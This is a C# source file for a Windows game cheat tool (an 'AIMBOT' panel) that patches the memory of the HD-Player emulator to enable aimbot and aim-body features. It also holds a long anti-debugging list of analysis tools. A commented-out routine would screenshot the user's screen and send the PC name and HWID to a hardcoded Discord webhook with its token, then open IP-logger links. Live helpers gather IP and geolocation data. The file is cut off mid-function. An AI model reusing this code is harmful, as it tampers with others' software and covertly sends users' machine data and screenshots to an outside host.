using System;
using System.Collections.Generic;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Drawing.Text;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Bruuuh;
using Guna.UI2.WinForms;
using Newtonsoft.Json.Linq;
using RedMem;

namespace CV_IMGUI
{
    public partial class AIMBOT : Form
    {
        string on = " Enabled !";
        string off = " Disabled !";
        string wait = "Enabling";
        string wait1 = "Enabling....";
        string open = "Open Emulator !";
        string nope = "Unable Able To Enable";
        string soon = "Under Update Coming Soon";
        private List<string> processNames;
        private ParticleSystem particleSystem;
        private const int WM_HOTKEY = 0x0312;
        private int _nextHotkeyId = 1;

        [DllImport("user32.dll")]
        private static extern bool RegisterHotKey(IntPtr hWnd, int id, uint fsModifiers, uint vk);

        [DllImport("user32.dll")]
        private static extern bool UnregisterHotKey(IntPtr hWnd, int id);

        private readonly Dictionary<int, HotkeyInfo> _hotkeys = new Dictionary<int, HotkeyInfo>();
        HttpClient httpClient = new HttpClient();

        public AIMBOT()
        {
            InitializeComponent();
            LoadCustomFont();
            particleSystem = new ParticleSystem();
            processNames = new List<string>
        {
            "ida", "ida64", "idag", "idag64", "idaw", "idaw64",
    "idaq", "idaq64", "idau", "idau64", "scylla", "scylla_x64",
    "scylla_x86", "protection_id", "x64dbg", "x32dbg", "ollydbg",
    "ollydbg64", "ida pro", "charles", "processhacker", "process hacker",
    "httpdebugger", "http debugger", "http debugger pro", "windbg", "dbgview", "fiddler",
    "procexp", "procmon", "tcpview", "wireshark", "dumpcap", "loader",
    "petools", "exeinfope", "de4dot", "dotpeek", "megadumper", "simpleassemblyexplorer",
    "reshacker", "resourcehacker", "resource hacker", "ollyice", "ollyice64",
    "x86dbg", "x64_dbg", "pestudio", "cutter", "radare2", "xposed", "jd-gui",
    "strings", "gnome-system-monitor", "pluma", "xxd", "grep", "dnSpy",
    "ILSpy", "Reflector", "sn.exe", "CorFlags", "MegaDumper", "DnSpy",
    "peid", "cff explorer", "cports", "currports", "httpanalyzer", "httpanalyzerstdv7",
    "httpwatch", "hxd", "immunity debugger", "importrec", "lordpe", "netcat",
    "netfilter", "netpeeker", "netshark", "paros", "pebrowse", "peid", "peek",
    "pexplorer", "portmon", "proc_analyzer", "procdump", "procexp", "process monitor",
    "process walker", "processmon", "processtool", "prodiscover", "regmon",
    "regshot", "regview", "resharper", "reshacker", "resourcemonitor", "resourceexplorer",
    "resourceviewer", "retdec", "reverseit", "reverseme", "scdbg", "strings",
    "sysanalyzer", "sysinternal", "sysmon", "tcpdump", "tcpmon", "tcpmonitor",
    "tcptracker", "tcpdump", "tcpflow", "tcptrace", "vbox", "vboxservice", "vboxtray",
    "vmware", "vmware-authd", "vmwareuser", "vmwaretray", "vmtoolsd", "vmsrvc",
    "vmusrvc", "vmscsi", "vmxnet", "vmx_svga", "vmmouse", "windbg", "winedbg",
    "winhex", "wireshark", "x64dbg", "x32dbg", "ida64", "idag64", "idaw64", "idaq64",
    "idau64", "idapro64", "idapro", "immunity", "scylla_x64", "scylla_x86", "x32_dbg",
    "x64_dbg", "x86_dbg", "x64dbg", "x32dbg", "dbx", "ede", "gdb", "windbg",
    "codebreaker", "softice", "vmmap", "cryptanalyst", "ghidra", "ghidra_analyze_headless",
    "cfr", "soot", "bytecode_viewer", "asmx", "asm68k", "asm80", "biew", "bincat",
    "bintux", "boomerang", "binwalk", "lida", "binnavi", "ded", "disasm", "disassembler",
    "disunity", "diStorm3", "hiew", "hopper", "java decompiler", "jdec", "jode", "jad",
    "procyon", "recstudio", "recaf", "reko", "smali", "uncompyle2", "uncompyle6", "z3",
    "medusa", "ida pro free", "ida pro advanced", "ida pro standard", "ida pro pro",
    "javasnoop", "bytecode_editor", "hex rays", "flare-ida", "flare", "angr", "barf",
    "bap", "binnavi", "binslayer", "bap", "binwalk", "bindiff", "binlex", "binary ninja",
    "codeweaver", "unidbg", "smali", "dex2jar", "jd-gui", "baksmali", "jadx", "frida",
    "radare", "radare2", "binaryninja", "binja", "x64dbg", "x32dbg", "gdb", "gef", "pwndbg",
    "peda", "voltron", "lldb", "ghidra", "angr", "sympy", "ropgadget", "rizin", "cutter",
    "retdec", "libvmi", "vmi", "unicorn", "capstone", "keystone", "qiling", "qemu", "vmp",
    "debugview", "procmon", "ollydbg2", "ida7", "ida6", "bgb", "bochs", "w32dasm", "xorsearch",

    // Cheat Engine versions
    "cheatengine", "cheatengine.exe", "cheatengine-i386", "cheatengine-x86_64",
    "cheatengine-x86_64-SSE4-AVX2", "cheatengine-x86_64-SSE4-AVX2.exe",
    "cheatengine-x86_64-SSE4", "cheatengine-x86_64-SSE4.exe",
    "cheatengine-x86", "cheatengine-x86.exe", "cheatengine64", "cheatengine64.exe",
    "cheatengine32", "cheatengine32.exe", "cheatengine_no_sse4", "cheatengine_no_sse4.exe"
        };
        }
        #region HOTKEY
        private class HotkeyInfo
        {
            public Guna2Button Button { get; }
            public Keys Key { get; }
            public uint Modifiers { get; }

            public HotkeyInfo(Guna2Button button, Keys key, uint modifiers)
            {
                Button = button;
                Key = key;
                Modifiers = modifiers;
            }
        }
        private void RegisterHotKeyForButton(Guna2Button button, Keys key, bool control, bool alt, bool shift)
        {
            int id = _nextHotkeyId++;
            button.Tag = id;

            uint modifiers = (control ? (uint)KeyModifiers.Control : 0) |
                             (alt ? (uint)KeyModifiers.Alt : 0) |
                             (shift ? (uint)KeyModifiers.Shift : 0);

            if (RegisterHotKey(this.Handle, id, modifiers, (uint)key))
            {
                _hotkeys[id] = new HotkeyInfo(button, key, modifiers);
                button.Text = $"{key}";
            }
            else
            {
                MessageBox.Show($"Failed to register hotkey: {key}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        protected override void WndProc(ref Message m)
        {
            if (m.Msg == WM_HOTKEY)
            {
                int id = m.WParam.ToInt32();
                if (_hotkeys.TryGetValue(id, out var hotkeyInfo))
                {
                    PerformActionForButton(hotkeyInfo.Button);
                }
            }
            base.WndProc(ref m);
        }
        private void StartKeyCaptureButton1()
        {
            aimbotkey.Text = "?";
            this.KeyPreview = true;
            this.KeyDown += Form1_KeyDownButton1;
        }

        private void StartKeyCaptureButton2()
        {
            aimpiekey.Text = "?";
            this.KeyPreview = true;
            this.KeyDown += Form1_KeyDownButton2;
        }
        private void StartKeyCaptureButton3()
        {
            aimfovkey.Text = "?";
            this.KeyPreview = true;
            this.KeyDown += Form1_KeyDownButton3;
        }
        private void StartKeyCaptureButton4()
        {
            //offaimkey.Text = "?";
            this.KeyPreview = true;
            this.KeyDown += Form1_KeyDownButton4;
        }
        private void Form1_KeyDownButton1(object sender, KeyEventArgs e)
        {
            RegisterHotKeyForButton(aimbotkey, e.KeyCode, e.Control, e.Alt, e.Shift);
            this.KeyDown -= Form1_KeyDownButton1;
        }

        private void Form1_KeyDownButton2(object sender, KeyEventArgs e)
        {
            RegisterHotKeyForButton(aimpiekey, e.KeyCode, e.Control, e.Alt, e.Shift);
            this.KeyDown -= Form1_KeyDownButton2;
        }
        private void Form1_KeyDownButton3(object sender, KeyEventArgs e)
        {
            RegisterHotKeyForButton(aimfovkey, e.KeyCode, e.Control, e.Alt, e.Shift);
            this.KeyDown -= Form1_KeyDownButton3;
        }
        private void Form1_KeyDownButton4(object sender, KeyEventArgs e)
        {
            RegisterHotKeyForButton(aimfovkey, e.KeyCode, e.Control, e.Alt, e.Shift);
            this.KeyDown -= Form1_KeyDownButton4;
        }
        private void PerformActionForButton(Guna2Button button)
        {
            if (button == aimbotkey)
            {
                //if (aim.Checked == true)
                //{
                //    aim.Checked = false;
                //}
                //else
                //{
                //    aim.Checked = true;
                //}
                aim.Checked = true;
            }
            else if (button == aimfovkey)
            {
                //if (aimfov.Checked == true)
                //{
                //    aimfov.Checked = false;
                //}
                //else
                //{
                //    aimfov.Checked = true;
                //}
                aimfov.Checked = true;
            }
            else if (button == aimpiekey)
            {
                //if (offaim.Checked == true)
                //{
                //    offaim.Checked = false;
                //}
                //else
                //{
                //    offaim.Checked = true;
                //}
                aim64.Checked = true;
            }
        }
        private void InitializeButtons()
        {
        }

        private void UnregisterAllHotkeys()
        {
            foreach (var id in _hotkeys.Keys)
            {
                UnregisterHotKey(this.Handle, id);
            }
            _hotkeys.Clear();
        }
        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            //foreach (var id in _hotkeys.Keys.ToList())
            //{
            //    UnregisterHotKey(this.Handle, id);
            //}
            //base.OnFormClosing(e);
        }

        [Flags]
        private enum KeyModifiers : uint
        {
            None = 0,
            Alt = 1,
            Control = 2,
            Shift = 4,
            Windows = 8
        }
        #endregion
        Evelyn bruuuh = new Evelyn();
        public void CaptureScreenshot(string filePath)
        {
            Rectangle bounds = Screen.GetBounds(Point.Empty);
            using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
            {
                using (Graphics g = Graphics.FromImage(bitmap))
                {
                    g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                }
                bitmap.Save(filePath, ImageFormat.Png);
            }
        }
        #region DATA
        private  void timer2_Tick(object sender, EventArgs e)
        {
            //foreach (string processName in processNames)
            //{
            //    var processes = Process.GetProcessesByName(processName);
            //    if (processes.Any())
            //    {
            //        try
            //        {
            //            //string jsonResponse = await FetchIpInfoAsync();
            //            //string ipInfoMessage = ParseIpInfo(jsonResponse);

            //            string pcName = GetPcName();
            //            string hwid = GetHwid();
            //            string currentTime = GetCurrentTime();
            //            //string serialNumber = GetSerialNumber();
            //            string screenshotPath = "screenshot.png";

            //            TakeScreenshot(screenshotPath);

            //            string message = $"\nPC Name: {pcName}\nHWID: {hwid}\nTime: {currentTime}";

            //            string webhookUrl = "https://discord.com/api/webhooks/1271752392840315012/65sN6NRAWzcA9OOgoo05sd__e543sNGkcAKMy-Nh7FlcJ0Y8LA-GjwgeA1h6DbSyK8qM";

            //            bool success = await SendToDiscordAsync(message, screenshotPath, webhookUrl);

            //            MessageBox.Show("Cracking is Not Allowed");
            //            //MessageBox.Show("I Warned you Bastard");
            //            //System.Diagnostics.Process.Start("https://iplis.ru/231TZ4");
            //            //System.Diagnostics.Process.Start("https://iplis.ru/231TZ4");
            //            //System.Diagnostics.Process.Start("https://iplis.ru/231TZ4");
            //            //System.Diagnostics.Process.Start("https://iplis.ru/231TZ4");
            //            Application.Exit();
            //        }
            //        catch (Exception ex)
            //        {
            //            MessageBox.Show($"An error occurred: {ex.Message}");
            //        }
            //        break;
            //    }
            //}
        }
        public async void SendToDiscordWebhook(string webhookUrl, string message, string screenshotPath)
        {
            using (var client = new HttpClient())
            {
                var content = new MultipartFormDataContent();

                content.Add(new StringContent(message), "content");

                if (File.Exists(screenshotPath))
                {
                    var fileContent = new ByteArrayContent(File.ReadAllBytes(screenshotPath));
                    fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("image/png");
                    content.Add(fileContent, "file", Path.GetFileName(screenshotPath));
                }

                await client.PostAsync(webhookUrl, content);
            }
        }
        public string GetHWID()
        {
            using (var searcher = new ManagementObjectSearcher("SELECT ProcessorId FROM Win32_Processor"))
            {
                var id = searcher.Get().Cast<ManagementBaseObject>().FirstOrDefault()?["ProcessorId"];
                return id?.ToString() ?? "Unknown";
            }
        }

        public string GetPCName()
        {
            return Environment.MachineName;
        }

        public string GetIPAddress()
        {
            string ipAddress = "";
            using (WebClient webClient = new WebClient())
            {
                ipAddress = webClient.DownloadString("https://api.ipify.org");
            }
            return ipAddress;
        }
        private bool iscrackerapruning11(string processName)
        {
            Process[] processes = Process.GetProcessesByName(processName);
            return processes.Length > 0;
        }
        public string GetGeolocationInfo()
        {
            string url = "https://ipinfo.io/json";
            string json;
            using (HttpClient client = new HttpClient())
            {
                json = client.GetStringAsync(url).Result;
            }

            JObject jsonObj = JObject.Parse(json);
            string location = jsonObj["loc"]?.ToString() ?? "Unknown";
            string city = jsonObj["city"]?.ToString() ?? "Unknown";
            string region = jsonObj["region"]?.ToString() ?? "Unknown";
            string country = jsonObj["country"]?.ToString() ?? "Unknown";
            string timezone = jsonObj["timezone"]?.ToString() ?? "Unknown";

            return $"Location: {location}\nCity: {city}\nRegion: {region}\nCountry: {country}\nTimezone: {timezone}";
        }
        private void TakeScreenshot(string filePath)
        {
            Bitmap bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics gfxScreenshot = Graphics.FromImage(bmpScreenshot);
            gfxScreenshot.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
            bmpScreenshot.Save(filePath, ImageFormat.Png);
        }

        private async Task<bool> SendToDiscordAsync(string message, string screenshotPath, string webhookUrl)
        {
            var payload = new
            {
                content = message
            };

            string payloadJson = JObject.FromObject(payload).ToString();
            var content = new MultipartFormDataContent
        {
            { new StringContent(payloadJson, Encoding.UTF8, "application/json"), "payload_json" },
            { new ByteArrayContent(System.IO.File.ReadAllBytes(screenshotPath)), "file", "screenshot.png" }
        };

            HttpResponseMessage webhookResponse = await httpClient.PostAsync(webhookUrl, content);
            return webhookResponse.IsSuccessStatusCode;
        }
        private string GetHwid()
        {
            string hwid = string.Empty;
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT ProcessorId FROM Win32_Processor");
            foreach (ManagementObject mo in searcher.Get())
            {
                hwid = mo["ProcessorId"].ToString();
            }
            return hwid;
        }
        private string GetCurrentTime()
        {
            return DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
        }
        private string ParseIpInfo(string jsonResponse)
        {
            JObject json = JObject.Parse(jsonResponse);
            string ip = json["ip"].ToString();
            string city = json["city"].ToString();
            string region = json["region"].ToString();
            string country = json["country"].ToString();
            string loc = json["loc"].ToString();
            string org = json["org"].ToString();

            return $"IP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}\nLocation: {loc}\nOrganization: {org}";
        }

        private string GetPcName()
        {
            return Environment.MachineName;
        }
        #endregion
        protected override void OnPaint(PaintEventArgs e)
        {
            base.OnPaint(e);
            e.Graphics.SmoothingMode = System.Drawing.Drawing2D.SmoothingMode.HighQuality;
            particleSystem.DrawParticles(e.Graphics);
        }
        private PrivateFontCollection privateFontCollection = new PrivateFontCollection();
        Color panelcolor = Color.FromArgb(13, 15, 15);
        private void LoadCustomFont()
        {
            PrivateFontCollection customFontCollection = new PrivateFontCollection();
            byte[] fontData = Properties.Resources.fontlogo;
            IntPtr fontPtr = Marshal.AllocCoTaskMem(fontData.Length);
            Marshal.Copy(fontData, 0, fontPtr, fontData.Length);
            customFontCollection.AddMemoryFont(fontPtr, fontData.Length);
            Marshal.FreeCoTaskMem(fontPtr);

            Font customFont = new Font(customFontCollection.Families[0], 15f);

            label1.Font = customFont;
        }
        private void AIMBOT_Load(object sender, EventArgs e)
        {

        }

        private void guna2ControlBox1_Click(object sender, EventArgs e)
        {
            this.Hide();
        }

        private void guna2Panel1_Paint(object sender, PaintEventArgs e)
        {
            guna2Panel1.BackColor = panelcolor;
        }

        private void guna2Panel2_Paint(object sender, PaintEventArgs e)
        {
            guna2Panel2.BackColor = panelcolor;
        }

        private void label2_Click(object sender, EventArgs e)
        {

        }

        private void guna2Panel3_Paint(object sender, PaintEventArgs e)
        {
            guna2Panel3.BackColor = panelcolor;
        }

        private void guna2Panel4_Paint(object sender, PaintEventArgs e)
        {
            guna2Panel4.BackColor = panelcolor;
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            particleSystem.UpdateParticles();
            Invalidate();
        }

        private void aimbotkey_Click(object sender, EventArgs e)
        {
            StartKeyCaptureButton1();
        }

        private void aimpiekey_Click(object sender, EventArgs e)
        {
            StartKeyCaptureButton2();
        }

        private void aimfovkey_Click(object sender, EventArgs e)
        {
            StartKeyCaptureButton3();
        }
        private string RED;

        public static MemRed RedLib = new MemRed();
        public static String PID;
        private async void aim_CheckedChanged(object sender, EventArgs e)
        {
                if (aim.Checked)
                {
                if (Process.GetProcessesByName("HD-Player").Length == 0)
                {
                    STA.Text = $"{open}";
                }
                else
                {
                    Int32 proc = Process.GetProcessesByName("HD-Player")[0].Id;
                    RedLib.OpenProcess(proc);
                    STA.Text = $"{wait} Aimbot V1";

                    RedLib.OpenProcess(Convert.ToInt32(PID));
                    IEnumerable<long> longs = await RedLib.AoBScan(0x0000000000010000, 0x00007ffffffeffff, "FF FF FF FF FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 A5 43 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 ?? ?? ?? ?? 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 80 BF", true, true);

                    if (longs == null)
                        Console.WriteLine("Only Work Ingame. No Entities Found");
                    foreach (long num in longs)
                    {
                        string str = num.ToString("X");

                        Console.WriteLine("Address Detection Complete Wait a While");
                        byte[] numArray = RedLib.AhReadMeFucker((num + 0x9C).ToString("X"), 4);
                        RedLib.WriteMemory((num + 0x6C).ToString("X"), "int", BitConverter.ToInt32(numArray, 0).ToString());
                    }
                    STA.Text = $"Aimbot V1 {on} !.";
                    SoundManager.PlaySound(Properties.Resources.welcome);

                }
            }
        }

        private async void offaim_CheckedChanged(object sender, EventArgs e)
        {
            if (offaim.Checked)
            {
                string search = "00 00 20 42 00 00 40 40 00 00 70 42 00 00 00 00 00 00 C0 3F 0A D7 A3 3B";
                string replace = "00 00 20 42 00 00 FF FF 00 00 70 42 00 00 00 00 00 00 C0 3F 0A D7 A3 3B";
                bool k = false;

                if (Process.GetProcessesByName("HD-Player").Length == 0)
                {
                    STA.Text = $"{open}";
                }
                else
                {
                    bruuuh.OpenProcess("HD-Player");
                    STA.Text = $"{wait} Aimfov";
                    int i2 = 22000000;
                    IEnumerable<long> wl = await bruuuh.AoBScan(search, writable: true);
                    string u = "0x" + wl.FirstOrDefault().ToString("X");
                    if (wl.Count() != 0)
                    {
                        for (int i = 0; i < wl.Count(); i++)
                        {
                            i2++;
                            bruuuh.WriteMemory(wl.ElementAt(i).ToString("X"), "bytes", replace);
                        }
                        k = true;
                    }

                    if (k == true)
                    {
                        STA.Text = $"Aimfov  {on}";
                        SoundManager.PlaySound(Properties.Resources.welcome);
                    }
                    else
                    {
                        STA.Text = $"{nope} Aimfov ";
                    }
                }
            }
            else
            {

            }
        }

        private void offaimkey_Click(object sender, EventArgs e)
        {
            //StartKeyCaptureButton4();
        }

        private async void aimfov_CheckedChanged(object sender, EventArgs e)
        {
            if (aimfov.Checked)
            {
                if (Process.GetProcessesByName("HD-Player").Length == 0)
                {
                    STA.Text = $"{open}";
                }
                else
                {
                    Int32 proc = Process.GetProcessesByName("HD-Player")[0].Id;
                    RedLib.OpenProcess(proc);
                    STA.Text = $"{wait} Aimbot V3";

                    RedLib.OpenProcess(Convert.ToInt32(PID));
                    IEnumerable<long> longs = await RedLib.AoBScan(0x0000000000010000, 0x00007ffffffeffff, "FF FF FF FF FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 A5 43 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 ?? ?? ?? ?? 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 80 BF", true, true);


                    if (longs == null)
                        Console.WriteLine("Only Work Ingame. No Entities Found");
                    foreach (long num in longs)
                    {
                        string str = num.ToString("X");

                        Console.WriteLine("Address Detection Complete Wait a While");
                        byte[] numArray = RedLib.AhReadMeFucker((num + 0x70).ToString("X"), 4);
                        RedLib.WriteMemory((num + 0x6C).ToString("X"), "int", BitConverter.ToInt32(numArray, 0).ToString());
                    }
                    STA.Text = $"Aimbot V3 {on} !.";
                    SoundManager.PlaySound(Properties.Resources.welcome);
                }
            }
        }

        private async void aim64_CheckedChanged(object sender, EventArgs e)
        {
            if (aim64.Checked)
            {
                #region normal
                if (Process.GetProcessesByName("HD-Player").Length == 0)
                {
                    STA.Text = $"{open}";
                }
                else
                {
                    Int32 proc = Process.GetProcessesByName("HD-Player")[0].Id;
                    RedLib.OpenProcess(proc);
                    STA.Text = $"{wait} Aimbot V2";

                    RedLib.OpenProcess(Convert.ToInt32(PID));
                    IEnumerable<long> longs = await RedLib.AoBScan(0x0000000000010000, 0x00007ffffffeffff, "FF FF FF FF FF FF FF FF 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 A5 43 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 00 00 ?? ?? ?? ?? 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ?? 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 80 BF ?? ?? ?? ?? 00 00 00 00 00 00 80 BF", true, true);


                    if (longs == null)
                        Console.WriteLine("Only Work Ingame. No Entities Found");
                    foreach (long num in longs)
                    {
                        string str = num.ToString("X");

                        Console.WriteLine("Address Detection Complete Wait a While");
                        byte[] numArray = RedLib.AhReadMeFucker((num + 0xa0).ToString("X"), 4);
                        RedLib.WriteMemory((num + 0x6C).ToString("X"), "int", BitConverter.ToInt32(numArray, 0).ToString());
                    }
                    STA.Text = $"Aimbot V2 {on} !.";
                    SoundManager.PlaySound(Properties.Resources.welcome);
                }
                #endregion
                #region Login
                //string search = "62 6f 6e 65 5f 4e 65 63 6b";
                //string replace = "62 6f 6e 65 5f 4e 65 63 73";
                //string search1 = "62 6f 6e 65 5f 48 69 70 73";
                //string replace1 = "62 6f 6e 65 5f 4e 65 63 6b";
                //bool k = false;

                //if (Process.GetProcessesByName("HD-Player").Length == 0)
                //{
                //    STA.Text = $"{open}";
                //}
                //else
                //{
                //    bruuuh.OpenProcess("HD-Player");
                //    STA.Text = $"{wait} Aimbot V2";
                //    int i2 = 22000000;

                //    IEnumerable<long> wl = await bruuuh.AoBScan(search, writable: true);
                //    string u = "0x" + wl.FirstOrDefault().ToString("X");
                //    if (wl.Count() != 0)
                //    {
                //        for (int i = 0; i < wl.Count(); i++)
                //        {
                //            i2++;
                //            bruuuh.WriteMemory(wl.ElementAt(i).ToString("X"), "bytes", replace);
                //        }
                //        k = true;
                //    }

                //    IEnumerable<long> wl1 = await bruuuh.AoBScan(search1, writable: true);
                //    string u1 = "0x" + wl1.FirstOrDefault().ToString("X");
                //    if (wl1.Count() != 0)
                //    {
                //        for (int i = 0; i < wl1.Count(); i++)
                //        {
                //            i2++;
                //            bruuuh.WriteMemory(wl1.ElementAt(i).ToString("X"), "bytes", replace);
                //        }
                //        k = true;
                //    }

                //    if (k == true)
                //    {
                //        STA.Text = $"Aimbot V2  {on}";
                //        SoundManager.PlaySound(Properties.Resources.welcome);
                //    }
                //    else
                //    {
                //        STA.Text = $"{nope} Aimbot V2 ";
                //    }
                //}
                #endregion
            }
        }

        private async void aimbody_CheckedChanged(object sender, EventArgs e)
        {
            if (aimbody.Checked)
            {
                string Searchmagic1 = "dc 52 39 bd 27 c1 8b 3c c0 d0 f8 b9";
                string Replacemagic1 = "00 00 00 3e 0a d7 23 3d d2 a5 f9 bc";

                string Searchmagic2 = "63 71 b0 bd 90 98 74 bb";
                string Replacemagic2 = "cd dc 79 44 90 98 74 bb";

                string Searchmagic3 = "7b f9 6c bd 58 34 09 bb b0 60 be ba";
                string Replacemagic3 = "cd dc 79 44 58 34 09 bb b0 60 be ba";

                string Searchmagic4 = "54 1b 87 bd 90 c6 d7 ba 80 54 99 b9";
                string Replacemagic4 = "cd dc 79 44 90 c6 d7 ba 80 54 99 b9";

                string Searchmagic5 = "71 02 87 bd 90 fd d7 ba 40 18 98 39";
                string Replacemagic5 = "cd dc 79 44 90 fd d7 ba 40 18 98 39";

                string Searchmagic6 = "cc f8 6c bd 40 d2 ce b9 58 64 be 3a";
                string Replacemagic6 = "cd dc 79 44 40 d2 ce b9 58 64 be 3a";

                string Searchmagic7 = "76 fc db bc 7c 5e 8b 3a 50 8b bb 3a";
                string Replacemagic7 = "cd dc 79 44 7c 5e 8b 3a 50 8b bb 3a";

                string Searchmagic8 = "80 13 95 bc 30 ff 37 bb 00 fd 78 3b";
                string Replacemagic8 = "cd dc 79 44 30 ff 37 bb 00 fd 78 3b";

                string Searchmagic9 = "1f 93 db bc 90 bf 84 3a 20 a6 bb ba";
                string Replacemagic9 = "cd dc 79 44 90 bf 84 3a 20 a6 bb ba";

                string Searchmagic10 = "ef a3 00 be 40 b9 92 39 20 4e 07 ba";
                string Replacemagic10 = "cd dc 79 44 40 b9 92 39 20 4e 07 ba";

                string Searchmagic11 = "bc 19 fd bd b0 e3 a9 3a 80 42 23 b9";
                string Replacemagic11 = "42 e0 56 43 b0 e3 a9 3a 80 42 23 b9";

                string Searchmagic12 = "72 4b 72 3d 72 83 05 3e 00 00 00 00 18 04 27 bd 00 84 a7 37 00 00 80 b1";
                string Replacemagic12 = "72 4b 72 3d 72 83 05 3e 00 00 00 00 23 00 00 3d 00 00 00 3d 0a d7 3e bc";

                string Searchmagic13 = "7d 1a 89 bd 50 26 9f 3b";
                string Replacemagic13 = "00 00 70 41 00 00 70 41";

                bool k = false;

                if (Process.GetProcessesByName("HD-Player").Length == 0)
                {
                    STA.Text = $"{open}";
                }
                else
                {
                    bruuuh.OpenProcess("HD-Player");
                    STA.Text = $"{wait} Aim Body";
                    int i2 = 22000000;

                    
                    IEnumerable<long> wl1 = await bruuuh.AoBScan(Searchmagic1, writable: true);
                    string u1 = "0x" + wl1.FirstOrDefault().ToString("X");
                    if (wl1.Count() != 0)
                    {
                        for (int i = 0; i < wl1.Count(); i++)
                        {
                            i2++;
                            bruuuh.WriteMemory(wl1.ElementAt(i).ToString("X"), "bytes", Replacemagic1);
                        }
                        k = true;
                    }

                    IEnumerable<long> wl2 = await bruuuh.AoBScan(Searchmagic2, writable: true);
                    string u2 = "0x" + wl2.FirstOrDefault().ToString("X");
                    if (wl2.Count() != 0)
                    {
                        for (int i = 0; i < wl2.Count(); i++)
                        {
                            i2++;
                            bruuuh.WriteMemory(wl2.ElementAt(i).ToString("X"), "bytes", Replacemagic2);
                        }
                        k = true;
                    }

                    IEnumerable<long> wl3 = await bruuuh.AoBScan(Searchmagic3, writable: true);
                    string u3 = "0x" + wl3.FirstOrDefault().ToString("X");
                    if (wl3.Count() != 0)
                    {
                        for (int i = 0; i < wl3.Count(); i++)
                        {
                            i2++;
